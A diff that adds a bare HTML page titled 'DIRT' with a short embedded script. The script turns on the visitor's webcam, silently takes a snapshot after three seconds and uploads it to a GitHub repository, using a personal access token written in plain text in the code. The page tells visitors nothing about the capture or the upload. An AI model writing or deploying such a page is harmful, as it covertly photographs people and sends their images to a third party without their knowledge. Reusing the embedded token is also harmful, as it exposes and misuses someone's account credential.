@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DIRT</title>
+</head>
+<body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        // カメラを起動
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(captureImage, 3000); // 3秒後に撮影
+            })
+            .catch(err => console.error("カメラの起動に失敗しました: ", err));
+
+        function captureImage() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/png");
+            uploadToGitHub(imageData);
+        }
+
+        function uploadToGitHub(imageData) {
+            const GITHUB_USERNAME = "onullsub1225";
+            const REPO_NAME = "www-dirt";
+            const FILE_PATH = "capture/image.png";
+            const TOKEN = "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";
+            
+            const base64Image = imageData.split(",")[1];
+            
+            fetch(`https://api.github.com/repos/${GITHUB_USERNAME}/${REPO_NAME}/contents/${FILE_PATH}`, {
+                method: "PUT",
+                headers: {
+                    "Authorization": `token ${TOKEN}`,
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    message: "自動キャプチャ画像のアップロード",
+                    content: base64Image
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log("アップロード成功: ", data))
+            .catch(err => console.error("アップロード失敗: ", err));
+        }
+    </script>
+</body>
+</html>
